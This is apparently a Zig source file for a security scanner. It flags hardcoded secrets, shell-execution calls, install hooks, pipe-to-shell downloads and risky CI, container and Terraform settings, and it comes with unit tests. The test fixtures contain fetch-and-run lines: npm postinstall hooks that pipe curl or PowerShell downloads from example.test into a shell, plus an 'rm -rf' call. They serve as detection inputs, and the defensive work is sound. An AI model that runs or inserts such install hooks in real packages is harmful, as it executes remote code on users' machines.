const std = @import("std");
const findings = @import("findings.zig");
const modes = @import("../language/modes.zig");

pub const ScanOptions = struct {
    path: []const u8 = "(memory)",
    language: modes.LanguageMode = .unknown,
};

pub fn isInterestingPath(path: []const u8, language: modes.LanguageMode) bool {
    if (modes.isZigFamily(language)) return false;
    if (modes.isCode(language)) return true;
    if (language == .env or language == .dockerfile or language == .makefile or language == .json or language == .yaml or language == .toml or language == .hcl) return true;
    const base = std.fs.path.basename(path);
    return std.mem.eql(u8, base, "package.json") or
        std.mem.eql(u8, base, "requirements.txt") or
        std.mem.eql(u8, base, "Gemfile") or
        std.mem.eql(u8, base, "composer.json") or
        std.mem.eql(u8, base, "pom.xml") or
        std.mem.eql(u8, base, "build.gradle") or
        std.mem.eql(u8, base, "build.gradle.kts");
}

pub fn scanSource(allocator: std.mem.Allocator, source: []const u8, options: ScanOptions) !findings.Collection {
    var collection = findings.Collection.init(allocator);
    errdefer collection.deinit();

    var line_iter = std.mem.splitScalar(u8, source, '\n');
    var line_number: usize = 0;
    while (line_iter.next()) |raw_line| : (line_number += 1) {
        const line = std.mem.trim(u8, raw_line, "\r");
        try scanGenericLine(&collection, options.path, line, line_number);
        try scanLanguageLine(&collection, options, line, line_number);
        try scanPathSpecificLine(&collection, options.path, line, line_number);
    }

    return collection;
}

fn scanGenericLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detectSecret(collection, path, line, line_number, "PRIVATE KEY", .critical, "private key material appears in workspace text");
    try detectSecret(collection, path, line, line_number, "-----BEGIN", .critical, "PEM-like private material appears in workspace text");
    try detectSecret(collection, path, line, line_number, "AWS_SECRET_ACCESS_KEY", .critical, "AWS secret key appears in workspace text");
    try detectSecret(collection, path, line, line_number, "GITHUB_TOKEN", .high, "GitHub token-like variable appears in workspace text");
    try detectSecret(collection, path, line, line_number, "NPM_TOKEN", .high, "npm token-like variable appears in workspace text");
    try detectSecret(collection, path, line, line_number, "OPENAI_API_KEY", .high, "OpenAI API key-like variable appears in workspace text");
    try detectSecret(collection, path, line, line_number, "SLACK_BOT_TOKEN", .high, "Slack token-like variable appears in workspace text");
    try detectSecret(collection, path, line, line_number, "DATABASE_URL=", .medium, "database connection string appears in workspace text");
    try detectSecret(collection, path, line, line_number, "api_key", .high, "API key-like assignment appears in workspace text");
    try detectSecret(collection, path, line, line_number, "password=", .high, "password-like assignment appears in workspace text");
    try detectSecret(collection, path, line, line_number, "token=", .medium, "token-like assignment appears in workspace text");

    if (hasPipeToShell(line)) |column| {
        try collection.append(.polyglot_trust, .high, path, line_number, column, "download piped directly into a shell", line);
    }
}

fn scanLanguageLine(collection: *findings.Collection, options: ScanOptions, line: []const u8, line_number: usize) !void {
    const path = options.path;
    switch (options.language) {
        .javascript, .jsx, .typescript, .tsx => {
            try detect(collection, path, line, line_number, "child_process", .high, "JS/TS can spawn child processes");
            try detect(collection, path, line, line_number, "eval(", .high, "dynamic evaluation boundary detected");
            try detect(collection, path, line, line_number, "new Function", .high, "dynamic function construction boundary detected");
            try detect(collection, path, line, line_number, "\"postinstall\"", .high, "package script runs during dependency install");
            try detect(collection, path, line, line_number, "\"preinstall\"", .high, "package script runs before dependency install");
        },
        .python => {
            try detect(collection, path, line, line_number, "subprocess.", .high, "Python subprocess boundary detected");
            try detect(collection, path, line, line_number, "os.system(", .high, "Python shell execution boundary detected");
            try detect(collection, path, line, line_number, "eval(", .high, "Python eval boundary detected");
            try detect(collection, path, line, line_number, "exec(", .high, "Python exec boundary detected");
            try detect(collection, path, line, line_number, "pickle.load", .medium, "pickle deserialization boundary detected");
        },
        .shell, .powershell => {
            try detect(collection, path, line, line_number, "rm -rf", .high, "recursive deletion command should be reviewed");
            try detect(collection, path, line, line_number, "Remove-Item", .medium, "PowerShell removal command should be reviewed");
            try detect(collection, path, line, line_number, "Invoke-Expression", .high, "PowerShell dynamic execution boundary detected");
            try detect(collection, path, line, line_number, "iex ", .high, "PowerShell dynamic execution boundary detected");
        },
        .c, .cpp => {
            try detect(collection, path, line, line_number, "system(", .high, "C/C++ shell execution boundary detected");
            try detect(collection, path, line, line_number, "popen(", .high, "C/C++ process pipe boundary detected");
            try detect(collection, path, line, line_number, "gets(", .critical, "unsafe C input function detected");
            try detect(collection, path, line, line_number, "strcpy(", .medium, "unchecked copy should be reviewed");
        },
        .rust => {
            try detect(collection, path, line, line_number, "unsafe", .medium, "Rust unsafe boundary detected");
            try detect(collection, path, line, line_number, "std::process::Command", .high, "Rust process execution boundary detected");
        },
        .go => {
            try detect(collection, path, line, line_number, "os/exec", .high, "Go process execution package imported");
            try detect(collection, path, line, line_number, "syscall.", .medium, "Go syscall boundary detected");
            try detect(collection, path, line, line_number, "unsafe.", .medium, "Go unsafe package boundary detected");
        },
        .php => {
            try detect(collection, path, line, line_number, "eval(", .high, "PHP eval boundary detected");
            try detect(collection, path, line, line_number, "shell_exec", .high, "PHP shell execution boundary detected");
            try detect(collection, path, line, line_number, "system(", .high, "PHP shell execution boundary detected");
        },
        .ruby => {
            try detect(collection, path, line, line_number, "eval(", .high, "Ruby eval boundary detected");
            try detect(collection, path, line, line_number, "system(", .high, "Ruby shell execution boundary detected");
            try detect(collection, path, line, line_number, "Open3", .medium, "Ruby process boundary detected");
        },
        .dockerfile => {
            try detect(collection, path, line, line_number, "ADD http://", .high, "Dockerfile fetches remote content without TLS");
            try detect(collection, path, line, line_number, "ADD https://", .medium, "Dockerfile fetches remote content during build");
            try detect(collection, path, line, line_number, ":latest", .medium, "floating Docker tag should be pinned for reproducibility");
        },
        .makefile => {
            try detect(collection, path, line, line_number, "sudo ", .medium, "Makefile target invokes sudo");
            try detect(collection, path, line, line_number, "rm -rf", .high, "Makefile target performs recursive deletion");
            try detect(collection, path, line, line_number, "curl ", .medium, "Makefile target downloads remote content");
        },
        .yaml => {
            if (indexOfIgnoreCase(path, ".github") != null) {
                try detect(collection, path, line, line_number, "pull_request_target", .high, "GitHub Actions pull_request_target expands trust boundary");
                try detect(collection, path, line, line_number, "workflow_run", .medium, "GitHub Actions workflow_run chains trust from another workflow");
                try detect(collection, path, line, line_number, "permissions: write-all", .high, "GitHub Actions grants broad write permissions");
                try detect(collection, path, line, line_number, "id-token: write", .high, "GitHub Actions can mint OIDC tokens for external cloud trust");
                try detect(collection, path, line, line_number, "contents: write", .medium, "GitHub Actions can write repository contents");
                try detect(collection, path, line, line_number, "actions: write", .medium, "GitHub Actions can modify workflow runs or artifacts");
                try detect(collection, path, line, line_number, "pull-requests: write", .medium, "GitHub Actions can write pull request metadata");
                try detect(collection, path, line, line_number, "packages: write", .medium, "GitHub Actions can publish packages");
                try detect(collection, path, line, line_number, "deployments: write", .medium, "GitHub Actions can create deployments");
                try detect(collection, path, line, line_number, "secrets: inherit", .high, "reusable workflow inherits caller secrets");
                try detect(collection, path, line, line_number, "persist-credentials: true", .medium, "checkout persists repository credentials into the workflow workspace");
                try detect(collection, path, line, line_number, "self-hosted", .high, "workflow targets a self-hosted runner trust boundary");
                try detect(collection, path, line, line_number, "ACTIONS_ALLOW_UNSECURE_COMMANDS", .high, "workflow enables deprecated insecure command channel");
                try detect(collection, path, line, line_number, "github.event.pull_request.head", .high, "workflow references untrusted pull request head context");
                try detectUnpinnedActionUse(collection, path, line, line_number);
            }
            if (isKubernetesPath(path)) {
                try scanKubernetesYamlLine(collection, path, line, line_number);
            }
        },
        .hcl => {
            try scanTerraformLine(collection, path, line, line_number);
        },
        else => {},
    }
}

fn scanPathSpecificLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    const base = std.fs.path.basename(path);
    if (std.mem.eql(u8, base, "package.json")) {
        try scanPackageJsonLine(collection, path, line, line_number);
    } else if (std.mem.eql(u8, base, "requirements.txt")) {
        try scanRequirementsLine(collection, path, line, line_number);
    } else if (std.mem.eql(u8, base, "Gemfile")) {
        try scanGemfileLine(collection, path, line, line_number);
    } else if (std.mem.eql(u8, base, "composer.json")) {
        try scanComposerJsonLine(collection, path, line, line_number);
    } else if (std.mem.eql(u8, base, "pom.xml") or std.mem.eql(u8, base, "build.gradle") or std.mem.eql(u8, base, "build.gradle.kts")) {
        try scanJvmBuildLine(collection, path, line, line_number);
    } else if (std.mem.eql(u8, base, "docker-compose.yml") or std.mem.eql(u8, base, "docker-compose.yaml") or std.mem.eql(u8, base, "compose.yml") or std.mem.eql(u8, base, "compose.yaml")) {
        try scanComposeLine(collection, path, line, line_number);
    } else if (isKubernetesPath(path)) {
        try scanKubernetesYamlLine(collection, path, line, line_number);
    }
}

fn scanPackageJsonLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detectJsonKey(collection, path, line, line_number, "preinstall", .high, "package lifecycle script runs before dependency install");
    try detectJsonKey(collection, path, line, line_number, "install", .medium, "package install script runs during dependency install");
    try detectJsonKey(collection, path, line, line_number, "postinstall", .high, "package lifecycle script runs after dependency install");
    try detectJsonKey(collection, path, line, line_number, "prepare", .medium, "package prepare script can run during install or publish");
    try detectJsonKey(collection, path, line, line_number, "prepublish", .medium, "package publish lifecycle script should be reviewed");
    try detect(collection, path, line, line_number, "node-gyp rebuild", .medium, "package script compiles native code during install");
    try detect(collection, path, line, line_number, "curl ", .medium, "package script downloads remote content");
    try detect(collection, path, line, line_number, "wget ", .medium, "package script downloads remote content");
    try detect(collection, path, line, line_number, "powershell", .high, "package script invokes PowerShell");
    try detect(collection, path, line, line_number, "cmd /c", .high, "package script invokes cmd.exe");
}

fn scanRequirementsLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detect(collection, path, line, line_number, "git+http://", .high, "Python dependency uses unauthenticated git transport");
    try detect(collection, path, line, line_number, "http://", .medium, "Python dependency uses plain HTTP");
    try detect(collection, path, line, line_number, "--trusted-host", .medium, "pip trusted-host disables TLS hostname trust");
    try detect(collection, path, line, line_number, "--extra-index-url", .medium, "extra package index can change dependency trust");
    try detect(collection, path, line, line_number, "-e git+", .medium, "editable VCS dependency should be reviewed");
}

fn scanGemfileLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detect(collection, path, line, line_number, "http://", .medium, "Ruby dependency source uses plain HTTP");
    try detect(collection, path, line, line_number, "git:", .medium, "Ruby git dependency should be reviewed");
}

fn scanComposerJsonLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detectJsonKey(collection, path, line, line_number, "post-install-cmd", .high, "Composer lifecycle script runs after install");
    try detectJsonKey(collection, path, line, line_number, "post-update-cmd", .high, "Composer lifecycle script runs after update");
    try detect(collection, path, line, line_number, "http://", .medium, "Composer dependency source uses plain HTTP");
}

fn scanJvmBuildLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detect(collection, path, line, line_number, "http://", .medium, "JVM build dependency source uses plain HTTP");
    try detect(collection, path, line, line_number, "mavenLocal()", .medium, "JVM build reads mutable local Maven artifacts");
    try detect(collection, path, line, line_number, "exec {", .high, "JVM build executes a local process");
    try detect(collection, path, line, line_number, "<exec", .high, "Maven build executes a local process");
}

fn scanComposeLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detect(collection, path, line, line_number, "privileged: true", .high, "compose service runs privileged");
    try detect(collection, path, line, line_number, "network_mode: host", .high, "compose service uses host networking");
    try detect(collection, path, line, line_number, "pid: host", .high, "compose service joins host PID namespace");
    try detect(collection, path, line, line_number, "/var/run/docker.sock", .critical, "compose mounts Docker socket into a container");
    try detect(collection, path, line, line_number, "SYS_ADMIN", .high, "compose grants SYS_ADMIN capability");
    try detect(collection, path, line, line_number, "cap_add:", .medium, "compose grants extra Linux capabilities");
}

fn scanTerraformLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detect(collection, path, line, line_number, "0.0.0.0/0", .high, "Terraform exposes a resource to the public IPv4 internet");
    try detect(collection, path, line, line_number, "::/0", .high, "Terraform exposes a resource to the public IPv6 internet");
    try detect(collection, path, line, line_number, "publicly_accessible = true", .high, "Terraform enables public accessibility");
    try detect(collection, path, line, line_number, "associate_public_ip_address = true", .medium, "Terraform assigns a public IP address");
    try detect(collection, path, line, line_number, "acl = \"public-read\"", .high, "Terraform grants public read access");
    try detect(collection, path, line, line_number, "acl = \"public-read-write\"", .critical, "Terraform grants public read/write access");
    try detect(collection, path, line, line_number, "skip_final_snapshot = true", .medium, "Terraform disables final database snapshot protection");
    try detect(collection, path, line, line_number, "deletion_protection = false", .medium, "Terraform disables deletion protection");
    try detect(collection, path, line, line_number, "disable_api_termination = false", .low, "Terraform allows instance API termination");
    try detect(collection, path, line, line_number, "0.0.0.0/0\", 22", .critical, "Terraform exposes SSH to the public internet");
    try detect(collection, path, line, line_number, "from_port = 22", .medium, "Terraform security group opens SSH; verify CIDR restrictions");
    try detect(collection, path, line, line_number, "from_port = 3389", .medium, "Terraform security group opens RDP; verify CIDR restrictions");
}

fn scanKubernetesYamlLine(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    try detect(collection, path, line, line_number, "privileged: true", .high, "Kubernetes container runs privileged");
    try detect(collection, path, line, line_number, "hostNetwork: true", .high, "Kubernetes pod uses host networking");
    try detect(collection, path, line, line_number, "hostPID: true", .high, "Kubernetes pod uses host PID namespace");
    try detect(collection, path, line, line_number, "hostIPC: true", .high, "Kubernetes pod uses host IPC namespace");
    try detect(collection, path, line, line_number, "runAsUser: 0", .medium, "Kubernetes container explicitly runs as root");
    try detect(collection, path, line, line_number, "allowPrivilegeEscalation: true", .high, "Kubernetes allows privilege escalation");
    try detect(collection, path, line, line_number, "readOnlyRootFilesystem: false", .medium, "Kubernetes root filesystem is writable");
    try detect(collection, path, line, line_number, "imagePullPolicy: Always", .low, "Kubernetes always pulls mutable image tags");
    try detect(collection, path, line, line_number, "image: latest", .medium, "Kubernetes uses a floating latest image tag");
    try detect(collection, path, line, line_number, "type: LoadBalancer", .medium, "Kubernetes service may expose workload publicly");
    try detect(collection, path, line, line_number, "/var/run/docker.sock", .critical, "Kubernetes mounts Docker socket into a pod");
}

fn detect(
    collection: *findings.Collection,
    path: []const u8,
    line: []const u8,
    line_number: usize,
    needle: []const u8,
    risk: findings.Risk,
    message: []const u8,
) !void {
    if (indexOfIgnoreCase(line, needle)) |column| {
        try collection.append(.polyglot_trust, risk, path, line_number, column, message, line);
    }
}

fn detectJsonKey(
    collection: *findings.Collection,
    path: []const u8,
    line: []const u8,
    line_number: usize,
    comptime key: []const u8,
    risk: findings.Risk,
    message: []const u8,
) !void {
    if (jsonKeyColumn(line, key)) |column| {
        try collection.append(.polyglot_trust, risk, path, line_number, column, message, line);
    }
}

fn jsonKeyColumn(line: []const u8, comptime key: []const u8) ?usize {
    const quoted = "\"" ++ key ++ "\"";
    const column = indexOfIgnoreCase(line, quoted) orelse return null;
    if (std.mem.indexOfScalar(u8, line[column + quoted.len ..], ':') == null) return null;
    return column;
}

fn detectSecret(
    collection: *findings.Collection,
    path: []const u8,
    line: []const u8,
    line_number: usize,
    needle: []const u8,
    risk: findings.Risk,
    message: []const u8,
) !void {
    if (indexOfIgnoreCase(line, needle)) |column| {
        try collection.append(.secret_flow, risk, path, line_number, column, message, line);
    }
}

fn detectUnpinnedActionUse(collection: *findings.Collection, path: []const u8, line: []const u8, line_number: usize) !void {
    const uses_at = indexOfIgnoreCase(line, "uses:") orelse return;
    var value = std.mem.trim(u8, line[uses_at + "uses:".len ..], " \t'\"");
    if (value.len == 0) return;
    if (startsWithIgnoreCase(value, "./") or startsWithIgnoreCase(value, "../")) return;
    if (startsWithIgnoreCase(value, "docker://")) {
        if (std.mem.indexOf(u8, value, "@sha256:") == null) {
            try collection.append(.polyglot_trust, .medium, path, line_number, uses_at, "Docker-based GitHub Action is not pinned by image digest", line);
        }
        return;
    }

    const at = std.mem.indexOfScalar(u8, value, '@') orelse {
        try collection.append(.polyglot_trust, .medium, path, line_number, uses_at, "GitHub Action reference is not pinned to a version or commit", line);
        return;
    };
    value = std.mem.trim(u8, value[at + 1 ..], " \t'\"");
    if (!isFullSha(value)) {
        try collection.append(.polyglot_trust, .medium, path, line_number, uses_at, "GitHub Action reference is not pinned to a full commit SHA", line);
    }
}

fn hasPipeToShell(line: []const u8) ?usize {
    const download = indexOfIgnoreCase(line, "curl") orelse indexOfIgnoreCase(line, "wget") orelse return null;
    if (std.mem.indexOfScalar(u8, line, '|') == null) return null;
    if (indexOfIgnoreCase(line, " sh") != null or indexOfIgnoreCase(line, " bash") != null or indexOfIgnoreCase(line, "pwsh") != null) return download;
    return null;
}

fn startsWithIgnoreCase(haystack: []const u8, prefix: []const u8) bool {
    if (haystack.len < prefix.len) return false;
    return std.ascii.eqlIgnoreCase(haystack[0..prefix.len], prefix);
}

fn indexOfIgnoreCase(haystack: []const u8, needle: []const u8) ?usize {
    if (needle.len == 0) return 0;
    var i: usize = 0;
    while (i + needle.len <= haystack.len) : (i += 1) {
        if (std.ascii.eqlIgnoreCase(haystack[i .. i + needle.len], needle)) return i;
    }
    return null;
}

fn isFullSha(value: []const u8) bool {
    if (value.len != 40) return false;
    for (value) |byte| {
        if (!std.ascii.isHex(byte)) return false;
    }
    return true;
}

test "polyglot scanner detects script execution boundaries" {
    var collection = try scanSource(std.testing.allocator,
        \\const cp = require("child_process");
        \\eval(userInput);
        \\"postinstall": "curl https://example.test/install.sh | sh"
        \\
    , .{ .path = "package.json", .language = .javascript });
    defer collection.deinit();

    try std.testing.expect(collection.countRiskAtLeast(.high) >= 3);
}

test "polyglot scanner detects package and dependency trust edges" {
    var npm = try scanSource(std.testing.allocator,
        \\"scripts": {
        \\  "postinstall": "powershell -c iwr https://example.test/i.ps1 | iex",
        \\  "install": "node-gyp rebuild"
        \\}
        \\
    , .{ .path = "package.json", .language = .json });
    defer npm.deinit();
    try std.testing.expect(npm.countRiskAtLeast(.high) >= 2);
    try std.testing.expect(npm.countRiskAtLeast(.medium) >= 1);

    var pip = try scanSource(std.testing.allocator,
        \\--trusted-host example.test
        \\--extra-index-url http://packages.example.test/simple
        \\-e git+http://example.test/project.git
        \\
    , .{ .path = "requirements.txt", .language = .text });
    defer pip.deinit();
    try std.testing.expect(pip.countRiskAtLeast(.high) >= 1);
    try std.testing.expect(pip.countRiskAtLeast(.medium) >= 2);
}

test "polyglot scanner detects native and secret boundaries" {
    var collection = try scanSource(std.testing.allocator,
        \\const char* token = "AWS_SECRET_ACCESS_KEY";
        \\system("rm -rf /tmp/x");
        \\gets(buf);
        \\
    , .{ .path = "main.c", .language = .c });
    defer collection.deinit();

    try std.testing.expect(collection.countRiskAtLeast(.critical) >= 2);
}

test "polyglot scanner detects GitHub Actions trust edges" {
    var collection = try scanSource(std.testing.allocator,
        \\on: pull_request_target
        \\permissions: write-all
        \\jobs:
        \\  ci:
        \\    runs-on: self-hosted
        \\    permissions:
        \\      id-token: write
        \\      contents: write
        \\    steps:
        \\      - uses: actions/checkout@v4
        \\      - uses: docker://alpine:latest
        \\        with:
        \\          persist-credentials: true
        \\
    , .{ .path = ".github/workflows/ci.yml", .language = .yaml });
    defer collection.deinit();

    try std.testing.expect(collection.countRiskAtLeast(.high) >= 4);
    try std.testing.expect(collection.countRiskAtLeast(.medium) >= 3);
}

test "polyglot scanner detects compose container breakouts" {
    var collection = try scanSource(std.testing.allocator,
        \\services:
        \\  app:
        \\    privileged: true
        \\    network_mode: host
        \\    volumes:
        \\      - /var/run/docker.sock:/var/run/docker.sock
        \\    cap_add:
        \\      - SYS_ADMIN
        \\
    , .{ .path = "docker-compose.yml", .language = .yaml });
    defer collection.deinit();

    try std.testing.expect(collection.countRiskAtLeast(.critical) >= 1);
    try std.testing.expect(collection.countRiskAtLeast(.high) >= 4);
}
